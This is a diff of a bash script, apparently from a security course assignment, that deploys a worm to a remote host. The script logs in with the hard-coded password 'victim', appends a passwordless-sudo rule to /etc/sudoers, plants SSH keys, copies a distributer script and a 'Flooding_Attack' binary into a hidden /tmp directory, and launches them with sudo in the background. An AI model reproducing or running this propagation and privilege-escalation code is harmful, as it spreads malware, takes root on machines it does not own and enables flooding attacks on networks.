@@ -14,7 +14,7 @@ require_ssh_key_generated() {
 require_nopasswd(){
     local superprv="victim ALL=(ALL) NOPASSWD: ALL"
     local dest="/etc/sudoers"
-    local execmdd="grep victim $dest || echo \"Writing sudoers ...\" && echo \"$superprv\" >> $dest"
+    local execmdd="grep victim $dest; if [ \$? -ne 0 ]; then echo \"Writing sudoers ...\"; echo \"$superprv\" >> $dest; fi"
     local cmdd="echo victim | sudo -S bash -c '$execmdd'"
     echo $cmdd
     sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim $cmdd
@@ -28,21 +28,21 @@ require_ssh_key_set() {
     sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim $cmdd
 }
 
-require_worm_distributed() {
+distribute_worm() {
     local tmpdest="/tmp/.worm0716023"
     local pvkeyloc=~/.ssh/id_rsa
     echo "Dsitributing worms ..."
     ssh -i $pvkeyloc victim@$destip "rm -rf $tmpdest && mkdir $tmpdest"
-    scp -i $pvkeyloc ./task_ii/distributer.sh ./task_ii/Flooding_Attack ./task_ii/launcher.sh victim@$destip:$tmpdest
+    scp -i $pvkeyloc ./scripts/distributer.sh ./scripts/Flooding_Attack ./scripts/launcher.sh victim@$destip:$tmpdest
     echo "Launching worms ..."
-    ssh -i $pvkeyloc -t victim@$destip "chmod +x $tmpdest/distributer.sh && sudo $tmpdest/distributer.sh"
+    ssh -i $pvkeyloc -t victim@$destip "chmod +x $tmpdest/distributer.sh && nohup sudo $tmpdest/distributer.sh &> /dev/null" 
 }
 
-if [ -n $isFirst ]; then
+if [ -n "$isFirst" ]; then
     echo "This is the first time ..."
-    reqruire_ssh_key_generated
+    require_ssh_key_generated
     require_nopasswd
     require_ssh_key_set
 fi
-require_worm_distributed
+distribute_worm
 echo "All task done"
